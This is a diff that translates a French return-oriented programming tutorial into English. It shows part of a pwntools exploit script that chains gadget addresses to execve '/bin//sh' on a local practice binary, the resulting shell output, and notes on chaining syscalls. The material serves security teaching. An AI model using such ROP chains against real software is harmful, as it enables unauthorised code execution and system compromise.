-p += pack('<I', 0x08049323) 	# xor eax, eax ; ret
+p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
 
-p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
+p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we make sure that this location contains 0x00 to end the string
 
-p += pack('<I', 0x080481c9) 	# pop ebx ; ret
-p += pack('<I', 0x080ea000) 	# Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
+p += pack('<I', 0x080481c9) 		# pop ebx ; ret
+p += pack('<I', 0x080ea000) 		# In ebx, we put the address of the beginning of .data, which contains "/bin//sh" followed by null bytes
 
-p += pack('<I', 0x080de7ad) 	# pop ecx ; ret
-p += pack('<I', 0x00000000) 	# On met ecx à 0
+p += pack('<I', 0x080de7ad) 		# pop ecx ; ret
+p += pack('<I', 0x00000000) 		# We set ecx to 0
 
-p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
-p += pack('<I', 0x00000000) 	# On met edx à 0
+p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
+p += pack('<I', 0x00000000) 		# We set edx to 0
 
-p += pack('<I', 0x08049323) 	# xor eax, eax ; ret
+p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
 
-for i in range(11):				# Afin d'avoir eax = 11, on boucle 11 fois
-	p += pack('<I', 0x0804812c) # inc eax ; ret
+for i in range(11):			        # In order to have eax = 11, we loop 11 times
+	p += pack('<I', 0x0804812c)	    # inc eax ; ret
 
-p += pack('<I', 0x0806c985) 	# int 0x80
+p += pack('<I', 0x0806c985) 		# int 0x80
 
 r.sendline(p)
 
 r.interactive()
 ```
 
-Ainsi, lorsque nous lançons notre exploit, nous récupérons bien un shell
-
-```bash
+So, when we launch our exploit, we get a shell :
+```
 $ python exploit.py 
 [+] Starting local process './rop': Done
 [*] Switching to interactive mode
@@ -467,15 +432,16 @@ You password is incorrect
 $ 
 ```
 
-ROP, c'est super chouette, amusez vous avec ça. Dans mon exemple, je n'avais malheureusement pas de gadget de la form
-
-```bash
+ROP, this is super cool, have fun with it. In my example, I unfortunately didn't have a gadget of the form :
+```
 int 0x80
 ret
 ```
 
-Donc je ne pouvais pas enchaîner les appels systèmes. Mais si vous avez ça dans un autre binaire, alors vous pouvez enchaîner presque autant d'appels systèmes que vous le souhaitez, et vous pouvez ainsi construire une chaine d'exécution complexe, seulement en utilisant des bouts de codes à droite et à gauche.
+So I couldn't chain the system calls. But if you have that in another binary, then you can chain almost as many system calls as you want, and you can build a complex execution chain, just by using bits of code left and right.
 
-Par ailleurs, si vous êtes intéressés pour aller un peu plus loin, je vous conseille vivement la lecture de l'excellent article de Geluchat [Petit Manuel du ROP à l'usage des débutants](https://www.dailysecurity.fr/return_oriented_programming/){:target="blank"}.
+Moreover, if you are interested in going a little further, I highly recommend you to read Geluchat's excellent article "[A Beginner's Manual for ROP - In French](https://www.dailysecurity.fr/return_oriented_programming/)".
 
 Have fun !
+
+(Translated by [MorpheusH3x](https://twitter.com/MorpheusH3x))
